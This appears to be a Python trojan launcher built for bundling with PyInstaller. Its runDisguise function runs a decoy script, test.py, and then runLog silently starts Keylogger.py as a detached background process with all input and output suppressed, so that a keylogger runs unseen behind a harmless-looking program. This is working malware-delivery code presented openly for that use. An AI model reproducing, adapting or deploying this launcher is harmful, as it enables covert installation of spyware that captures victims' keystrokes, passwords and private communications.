import subprocess
import os
import sys
import platform

# Check if the the program is run as a bundled executable or just normal script
if getattr(sys, "frozen", False):
    # Getting the temp folder in which pyinstaller stores the bundled files
    path = sys._MEIPASS
else:
    # Getting the directory of this file
    path = os.path.dirname(__file__)

def runDisguise():
    programPath = os.path.join(path, "test.py")
    subprocess.run(["python", programPath])
    runLog()

def runLog():
    programPath = os.path.join(path, "Keylogger.py")
    if platform.system() == "Windows":
        log_process = subprocess.Popen(
            ["python", programPath],
            creationflags=subprocess.DETACHED_PROCESS,
            stdin=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL)
    else:
        log_process = subprocess.Popen(["python", programPath],
                        stdin=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                        stdout=subprocess.DEVNULL)

    log_process.wait()
    
if __name__ == "__main__":
    runDisguise()
